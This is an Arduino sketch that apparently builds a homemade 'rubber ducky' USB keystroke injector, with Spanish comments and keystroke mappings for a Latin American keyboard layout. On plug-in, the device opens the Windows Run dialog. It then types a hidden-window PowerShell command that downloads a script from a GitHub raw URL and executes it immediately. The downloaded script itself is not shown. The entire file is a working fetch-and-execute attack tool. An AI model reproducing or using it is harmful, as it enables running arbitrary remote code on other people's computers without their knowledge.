#include "Keyboard.h"

// Tu URL de GitHub
const char* scriptUrl = "https://raw.githubusercontent.com/M1ch43l-B/rubber-ducky-casero/refs/heads/main/src/fondo.ps1";

void typeLatam(String text) {
  for (int i = 0; i < text.length(); i++) {
    char c = text[i];
    
    // Mapeos que ya confirmaste que funcionan en tu teclado
    if (c == '-') { Keyboard.press('/'); } 
    else if (c == ':') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('.'); } 
    else if (c == '/') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('7'); }
    else if (c == '.') { Keyboard.press('.'); }
    else if (c == '\'') { Keyboard.press('-'); } // Comilla simple
    else if (c == '\"') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('2'); }
    else if (c == '(') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('8'); }
    else if (c == ')') { Keyboard.press(KEY_LEFT_SHIFT); Keyboard.press('9'); }
    else { Keyboard.press(c); }
    
    delay(20);
    Keyboard.releaseAll();
  }
}

void setup() {
  Keyboard.begin();
  delay(5000); 

  // 1. Abrir Ejecutar
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(150);
  Keyboard.releaseAll();
  delay(1000);

  // 2. Comando ultra-corto (Stager)
  // Descarga el script de tu GitHub y lo ejecuta al momento
  typeLatam("powershell -NoP -W h -C \"IEX(iwr '");
  typeLatam(scriptUrl);
  typeLatam("')\""); 

  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
